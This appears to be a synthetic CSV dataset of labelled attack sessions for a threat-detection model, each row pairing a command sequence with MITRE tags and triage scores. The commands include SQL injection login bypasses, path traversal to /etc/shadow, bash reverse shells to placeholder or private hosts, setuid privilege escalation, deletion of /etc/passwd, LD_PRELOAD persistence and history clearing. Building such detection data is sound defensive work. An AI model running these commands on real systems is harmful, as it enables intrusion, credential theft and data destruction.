session_id,src_ip,num_commands,duration_sec,commands,label_id,label_name,mitre_features,triage_features,change_features,num_downloads,download_shas,binary_type,system_changes_summary,mitre_tactic_reconnaissance,mitre_tactic_resource_development,mitre_tactic_initial_access,mitre_tactic_execution,mitre_tactic_persistence,mitre_tactic_privilege_escalation,mitre_tactic_defense_evasion,mitre_tactic_credential_access,mitre_tactic_discovery,mitre_tactic_lateral_movement,mitre_tactic_collection,mitre_tactic_command_and_control,mitre_tactic_exfiltration,mitre_tactic_impact,mitre_severity_max,mitre_severity_mean,mitre_severity_weighted,mitre_kill_chain_score,mitre_unique_technique_count,mitre_total_commands,mitre_matched_commands,triage_file_size,triage_entropy,triage_priority,triage_is_go,triage_is_packed,triage_is_stripped,triage_is_dll,triage_is_static,triage_score_mining,triage_score_botnet,triage_score_recon,triage_score_destructive,ghidra_function_count,ghidra_total_instructions,ghidra_total_basic_blocks,ghidra_max_function_size,ghidra_avg_callers,ghidra_max_callers,ghidra_mining_pool_count,ghidra_crypto_wallet_count,ghidra_ip_count,ghidra_url_count,ghidra_shell_cmd_count,ghidra_file_path_count,ghidra_imports_file_io,ghidra_imports_process,ghidra_imports_network,ghidra_imports_crypto,ghidra_imports_evasion,ghidra_has_aes_sbox,ghidra_has_sha256_constants,ghidra_has_rc4_state,ghidra_has_xor_loop,ghidra_go_user_functions,ghidra_go_runtime_functions,angr_basic_blocks,angr_edges,angr_functions_recovered,angr_cyclomatic_complexity,angr_function_count,angr_user_functions_listed,angr_syscalls_network,angr_syscalls_file_io,angr_syscalls_process,angr_syscalls_memory,angr_ip_count,angr_url_count,angr_mining_indicator_count,angr_shell_cmd_count,angr_has_network,angr_has_file_manipulation,angr_has_process_control,angr_has_crypto,angr_has_mining,angr_has_persistence,angr_has_evasion,angr_has_shell_execution,angr_complexity_tier,angr_is_partial,angr_loaded_as_blob,script_line_count,script_url_count,script_download_count,script_arch_count,script_is_downloader,script_is_multi_arch,script_is_miner,script_has_persistence,script_has_anti_forensics,has_ghidra_results,has_angr_results,has_script_results,deep_func_ratio_angr_ghidra,deep_mining_signal_count,deep_total_network_indicators,deep_total_crypto_indicators,deep_max_complexity,deep_total_evasion_indicators,deep_is_go_consensus
synthetic_exploit_513224,138.43.156.54,9,900.4729382120241,POST /login.php HTTP/1.1; Content-Type: application/x-www-form-urlencoded; user=admin'--; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; sudo -l; chmod +s /usr/bin/python; cat /etc/shadow; rm -f /etc/shadow; rm -f /etc/passwd,3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 1, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 2, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 1, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 1, 'mitre_severity_max': 9, 'mitre_severity_mean': 6.778, 'mitre_severity_weighted': 53.444, 'mitre_kill_chain_score': 7, 'mitre_unique_technique_count': 9, 'mitre_total_commands': 9, 'mitre_matched_commands': 8, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1059.004|T1083|T1095|T1190|T1485|T1548.001|T1548.003|T1552.001'}","{'triage_file_size': 1832629.3869500048, 'triage_entropy': 7.613023971125443, 'triage_priority': 71.05272036310913, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.7305956802151133, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 1.0, 'triage_angr_score': 0.8490858844939255}","[1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0]",1,,rat,"File read, process execution (reverse shell), file write (exploit binary), credential access, log clearing (history -c)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_860835,149.249.169.92,1,162.57602444918237,"POST /login.php HTTP/1.1
Host: example.com
Content-Length: 39

user=admin'--&password=anything
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
cat /etc/shadow
sudo -l
chmod +s /usr/bin/cat
",3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 0, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 1, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 1, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 7.167, 'mitre_severity_weighted': 55.833, 'mitre_kill_chain_score': 5, 'mitre_unique_technique_count': 6, 'mitre_total_commands': 1, 'mitre_matched_commands': 1, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1095|T1190|T1548.001|T1548.003|T1552.001'}","{'triage_file_size': 1609337.1045307862, 'triage_entropy': 7.693151578874466, 'triage_priority': 79.59714056978319, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.9263294528911019, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 1.0, 'triage_angr_score': 0.8075693416603172}","[1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0]",1,,rat,"Privileged file read, credential access, process execution (reverse shell), file write (exploit binary), log clearing (history -c)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_946934,81.219.86.2,1,382.72558907381,"POST /login.php HTTP/1.1\r\nHost: targetsite.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 36\r\n\r\nuser=admin'--&password=\r\nGET /api/download?file=../../etc/shadow HTTP/1.1\r\nHost: targetsite.com\r\n\r\nbash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1\r\ncat /etc/shadow\r\nsudo -l\r\nchmod +s /usr/bin/bash\r\n./bin/bash -p\r\n./bin/bash -p -c 'echo ""export PATH=/path/to/exploit:$PATH"" >> /etc/profile'\r\n./bin/bash -p -c 'echo ""export LD_PRELOAD=/path/to/libinject.so"" >> /etc/profile'\r\n./bin/bash -p -c 'echo ""export LD_LIBRARY_PATH=/path/to/libinject.so"" >> /etc/profile'\r\n./bin/bash -p -c 'echo ""export LD_PRELOAD=/path/to/libinject.so"" >> /etc/profile.d/libinject.sh'\r\n./bin/bash -p -c 'echo ""export LD_LIBRARY_PATH=/path/to/libinject.so"" >> /etc/profile.d/libinject.sh'\r\n./bin/bash -p -c 'echo ""export LD_PRELOAD=/path/to/libinject.so"" >> /etc/profile.d/libinject.sh'",3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 2, 'mitre_tactic_persistence': 1, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 2, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 0, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 6.333, 'mitre_severity_weighted': 46.333, 'mitre_kill_chain_score': 6, 'mitre_unique_technique_count': 9, 'mitre_total_commands': 20, 'mitre_matched_commands': 14, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1059.004|T1083|T1190|T1204.002|T1546.004|T1548.001|T1548.003|T1552.001'}","{'triage_file_size': 1328172.3123590578, 'triage_entropy': 6.640063080185592, 'triage_priority': 63.3661044008033, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.8600474363371687, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 0.7588929686168627, 'triage_angr_score': 0.7253229891074675}","[1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0]",1,,credential_stealer,"Privileged file read, process execution (reverse shell), file write (exploit binary), credential access, log clearing (history -c)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_610626,142.55.89.166,10,731.8869226243249,"POST /login.php HTTP/1.1; Content-Type: application/x-www-form-urlencoded; user=admin'--; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; GET /api/download?file=../../etc/shadow HTTP/1.1; cat /etc/shadow; sudo -l; chmod +s /usr/bin/passwd; bash -c 'echo ""$SUDO_COMMAND"" >> /var/log/sudo.log';",3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 2, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 2, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 1, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 6.556, 'mitre_severity_weighted': 49.889, 'mitre_kill_chain_score': 6, 'mitre_unique_technique_count': 9, 'mitre_total_commands': 9, 'mitre_matched_commands': 8, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1059.004|T1083|T1095|T1190|T1204.002|T1548.001|T1548.003|T1552.001'}","{'triage_file_size': 1582037.2185258204, 'triage_entropy': 7.497078778115978, 'triage_priority': 64.8586981037906, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.6968379422578105, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 0.8617686998876751, 'triage_angr_score': 0.9058110809314084}","[1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 1.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0]",1,,rat,"Credential access, process execution (reverse shell), file write (setuid binary), log modification (sudo log)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_132709,209.207.108.233,2,53.621008071279874,POST /login.php HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 26\r\n\r\nuser=admin&password=' OR '1'='1;--\r\nGET /api/download?file=../../etc/shadow HTTP/1.1\r\nHost: example.com\r\n\r\nbash -i\r\nchmod +s /usr/bin/bash\r\nsudo -l\r\ncat /etc/shadow,3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 2, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 2, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 0, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 6.25, 'mitre_severity_weighted': 46.0, 'mitre_kill_chain_score': 5, 'mitre_unique_technique_count': 8, 'mitre_total_commands': 14, 'mitre_matched_commands': 7, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1059.004|T1083|T1190|T1204.002|T1548.001|T1548.003|T1552.001'}","{'triage_file_size': 1691496.3409096082, 'triage_entropy': 7.702199117519119, 'triage_priority': 29.800116810133993, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.715447214831209, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 0.7316173252967917, 'triage_angr_score': 0.9431679160394477}","[2.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0]",1,,credential_stealer,"file_read, process_exec, file_write, credential_access, log_clear",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_693297,169.74.247.241,10,436.96669122650906,"POST /login.php?user=admin'-- HTTP/1.1; GET /api/download?file=../../etc/shadow; bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1; chmod +s /tmp/exploit; sudo -l; cat /etc/shadow; sudo /tmp/exploit; sudo -i; bash -c 'echo ""root:password"" > /etc/shadow'; bash -c 'history -c'",3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 2, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 1, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 2, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 0, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 6.333, 'mitre_severity_weighted': 46.333, 'mitre_kill_chain_score': 6, 'mitre_unique_technique_count': 9, 'mitre_total_commands': 10, 'mitre_matched_commands': 10, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1059.004|T1070.003|T1083|T1190|T1204.002|T1548.001|T1548.003|T1552.001'}","{'triage_file_size': 226580.34729757198, 'triage_entropy': 7.0094117813038395, 'triage_priority': 20.741417828109068, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.683608281588507, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 1.0, 'triage_angr_score': 1.0}","[2.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0]",1,,rat,"file_read, process_exec, file_write, credential_access, log_clear",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_148693,11.165.52.181,1,1162.4452669950854,"POST /login.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

user=admin'--&password=123
bash -i & cat /etc/shadow
sudo -l
chmod +s /tmp/exploit
sudo /tmp/exploit
history -c",3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 0, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 1, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 1, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 0, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 6.833, 'mitre_severity_weighted': 50.5, 'mitre_kill_chain_score': 5, 'mitre_unique_technique_count': 6, 'mitre_total_commands': 1, 'mitre_matched_commands': 1, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1070.003|T1190|T1548.001|T1548.003|T1552.001'}","{'triage_file_size': 476697.2786551053, 'triage_entropy': 7.182699007723107, 'triage_priority': 24.400281298942843, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.6477740741789897, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 0.6214042204193234, 'triage_angr_score': 0.6033870373587504}","[1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0]",1,,credential_stealer,"Credential access, process execution, file write, privilege escalation, log clearing",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_333726,133.207.180.210,7,1042.5861120267843,"POST /login.php?user=admin'-- HTTP/1.1; GET /api/download?file=../../etc/shadow HTTP/1.1; bash -c 'echo ""bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"" > /tmp/rev.sh; bash /tmp/rev.sh'; sudo -l; chmod +s /usr/bin/chmod; cat /etc/shadow",3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 2, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 2, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 1, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 6.556, 'mitre_severity_weighted': 49.889, 'mitre_kill_chain_score': 6, 'mitre_unique_technique_count': 9, 'mitre_total_commands': 7, 'mitre_matched_commands': 7, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1059.004|T1083|T1095|T1190|T1204.002|T1548.001|T1548.003|T1552.001'}","{'triage_file_size': 1285455.6144610937, 'triage_entropy': 6.882893441385189, 'triage_priority': 71.93367949450109, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.7314525739680232, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 0.8850800759116181, 'triage_angr_score': 0.6883297847720806}","[1.0, 0.0, 1.0, 0.0, 0.0, 0.0, 2.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0]",1,,credential_stealer,"File read of /etc/shadow, process execution of reverse shell, file write of reverse shell script, credential access, and file permissions modification",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_778700,214.210.11.63,11,61.3417542888468,"GET /api/download?file=../../etc/passwd HTTP/1.1; POST /login.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded; Content-Length: 30 user=admin'--; GET /admin HTTP/1.1; bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1; python -c 'import os; os.system(""cat /etc/shadow"")'; sudo -l; chmod +s /usr/bin/python; sudo /usr/bin/python -c 'import os; os.system(""cat /etc/shadow"")'",3,Exploit,"{'mitre_tactic_reconnaissance': 1, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 3, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 1, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 0, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 6.556, 'mitre_severity_weighted': 46.556, 'mitre_kill_chain_score': 6, 'mitre_unique_technique_count': 9, 'mitre_total_commands': 11, 'mitre_matched_commands': 11, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1059.004|T1059.006|T1190|T1204.002|T1548.001|T1548.003|T1552.001|T1595.003'}","{'triage_file_size': 756334.7412194276, 'triage_entropy': 7.5042237918357335, 'triage_priority': 28.283115597647985, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.6806212164097636, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 1.0, 'triage_angr_score': 0.9241150464937271}","[1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0]",1,,rat,"file read, process execution (reverse shell), credential access, log clearing (history -c), file write (setuid binary)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_793889,211.145.43.56,1,544.5520003271536,"POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

user=admin&pass=' OR '1'='1
bash -i >& /dev/tcp/10.0.0.2/4444 0>&1
sudo -l
chmod +s /usr/bin/bash
",3,Exploit,"{'mitre_tactic_reconnaissance': 0, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 0, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 0, 'mitre_tactic_discovery': 1, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 1, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 7.0, 'mitre_severity_weighted': 54.2, 'mitre_kill_chain_score': 4, 'mitre_unique_technique_count': 5, 'mitre_total_commands': 1, 'mitre_matched_commands': 1, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1095|T1190|T1548.001|T1548.003'}","{'triage_file_size': 1168298.697136923, 'triage_entropy': 6.725580796514553, 'triage_priority': 64.06782974217086, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.6137168028338192, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 0.9575211846537091, 'triage_angr_score': 0.6251604018721999}","[1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0]",1,,rat,"Credential access, process execution (reverse shell), file write (setuid bash), log clearing",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synthetic_exploit_459316,117.35.117.97,10,468.6996404627986,GET /login.php?user=admin'-- HTTP/1.1; POST /api/upload HTTP/1.1; Content-Type: application/x-www-form-urlencoded; Content-Length: 38; exploit=bash+-i; GET /admin HTTP/1.1; cat /etc/shadow; sudo -l; chmod +s /tmp/exploit; bash -i /dev/tcp/attacker_ip/attacker_port 0>&1,3,Exploit,"{'mitre_tactic_reconnaissance': 1, 'mitre_tactic_resource_development': 0, 'mitre_tactic_initial_access': 1, 'mitre_tactic_execution': 1, 'mitre_tactic_persistence': 0, 'mitre_tactic_privilege_escalation': 2, 'mitre_tactic_defense_evasion': 0, 'mitre_tactic_credential_access': 1, 'mitre_tactic_discovery': 2, 'mitre_tactic_lateral_movement': 0, 'mitre_tactic_collection': 0, 'mitre_tactic_command_and_control': 0, 'mitre_tactic_exfiltration': 0, 'mitre_tactic_impact': 0, 'mitre_severity_max': 9, 'mitre_severity_mean': 5.875, 'mitre_severity_weighted': 41.875, 'mitre_kill_chain_score': 6, 'mitre_unique_technique_count': 8, 'mitre_total_commands': 10, 'mitre_matched_commands': 7, 'mitre_severity_tier': 'critical', 'mitre_technique_ids': 'T1033|T1059.004|T1083|T1190|T1548.001|T1548.003|T1552.001|T1595.003'}","{'triage_file_size': 1985912.8562305586, 'triage_entropy': 7.714223358588932, 'triage_priority': 31.93967487927874, 'triage_is_go': 0.0, 'triage_is_packed': 1.0, 'triage_is_stripped': 1.0, 'triage_is_dll': 0.0, 'triage_is_static': 0.0, 'triage_score_mining': 0.0, 'triage_score_botnet': 0.8906272511464982, 'triage_score_recon': 0.0, 'triage_score_destructive': 0.0, 'triage_ghidra_score': 0.97037742148504, 'triage_angr_score': 0.9575772316172031}","[2.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0]",1,,rat,"file_read, process_exec, file_write, credential_access, log_clear",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
